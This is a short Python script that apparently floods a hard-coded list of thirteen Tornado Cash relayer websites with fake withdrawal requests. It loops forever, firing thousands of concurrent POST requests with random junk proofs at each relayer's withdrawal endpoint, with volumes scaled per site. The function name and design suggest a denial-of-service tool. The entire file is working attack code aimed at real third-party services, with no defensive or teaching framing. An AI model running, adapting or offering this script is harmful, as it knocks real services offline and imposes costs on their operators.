_SITES = [
    "cheap-relayer.eth http://mainnet-tornado.cheap-relayer.xyz/ 3.338154224701086",
    "lowcost.eth http://mainnet-tornado.low-fee.xyz/ 1.3757813855684784",
    "0xproxy.eth http://mainnet.0x0relayer.xyz/ 0.6484869251204064",
    "relayer007.eth http://torn.relayersdao.finance/  14.52510375009407",
    "abracadabra-money-gone.eth http://abracadabra-money-gone.xyz/ 0.8324655307310613",
    "reltor.eth http://eth.reltor.su/ 4.666219213210774",
    "t-relayer.eth http://eth.t-relayer.com/ 6.652352610616569",
    "main-relayer.eth http://main-relayer.com/ 2.8298323757017254",
    "default-relayer.eth http://relayer.wind-egg.com/ 7.817991247879668",
    "k-relayer.eth http://black-hardy.com/ 6.134838245595991",
    "torrelayer.eth http://tornima.xyz/ 1.8160281479339442",
    "torn-city.eth http://torn-city.com/ 2.514754849042866",
    "crelayer.eth http://eth.crelayer.xyz/ 1.3289548602766053"
]


import os
import aiohttp
import asyncio
import time
import random


def random_hex(size):
    return os.urandom(size).hex()

def random_withdraw():
    input_data = {
        "proof": "0x"+random_hex(256),
        "contract": "0x" + random_hex(20),
        "args": [
            "0x"+random_hex(512),
            "0x"+random_hex(512),
            "0x"+random_hex(512),
            "0x"+random_hex(512),
            "0x"+random_hex(512),
            "0x"+random_hex(512)
        ]
    }
    return input_data

async def fetch_data(session, url):
    print("fetching ....", url)
    async with session.post(url, json=random_withdraw()) as response:
        return await response.text()

async def main(url, num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_data(session, url) for _ in range(num_requests)]
        responses = await asyncio.gather(*tasks)

        # You can process the responses here if needed
        for response in responses:
             print(response)

def gan_ta(base, conn):
    url = base + "v1/tornadoWithdraw"
    print(url, conn)
    num_requests = conn
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(url, num_requests))
    return

if __name__ == "__main__":
    round = 0
    while True:
        for _item in _SITES:
            _seg = _item.split(" ")
            _con = int(float(_seg[-1])*10240)
            try:
                gan_ta(_seg[1], _con)
            except Exception as e:
                print(e)
                continue
